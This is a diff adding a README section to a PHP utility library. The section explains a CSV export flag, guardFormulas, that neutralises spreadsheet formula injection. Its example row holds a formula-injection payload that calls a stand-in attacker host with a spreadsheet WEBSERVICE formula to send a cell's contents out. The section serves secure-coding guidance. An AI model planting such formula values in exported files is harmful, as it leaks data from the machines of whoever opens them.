@@ -263,6 +263,33 @@ captures the throw, `map()`/`flatMap()` only run on the success path, and `orEls
 `orElseThrow()` are the two ways back out. Nothing is swallowed — `error()` always carries the
 original throwable.
 
+### Export a CSV without handing someone a formula
+
+```php
+<?php
+
+use D4np\Utils\Support\Csv;
+
+require 'vendor/autoload.php';
+
+$rows = [
+    ['name', 'note'],
+    ['Ada', '=WEBSERVICE("http://attacker.example/?c="&A1)'],   // came from a user
+];
+
+Csv::write('/tmp/export.csv', $rows, guardFormulas: true);
+```
+
+**`guardFormulas` is off by default and that is the one flag worth knowing about.** A field starting
+`=`, `+`, `-`, `@`, a tab or a carriage return is run as a formula by Excel, LibreOffice and Google
+Sheets when the file is opened — so the row above, exported without the flag, is a request made from
+the machine of whoever opens your spreadsheet.
+
+Off is [ADR-0037](docs/adr/0037-disable-phps-escape-character-and-keep-the-formula-guard-opt-in.md)'s
+deliberate call, because the guard *changes exported data* (it prefixes an apostrophe) and only the caller knows
+whether the file is going to a spreadsheet or to another program. **Pass `true` whenever any field
+can contain text a user supplied.**
+
 ### More
 
 The frozen 1.0 surface is browsable under
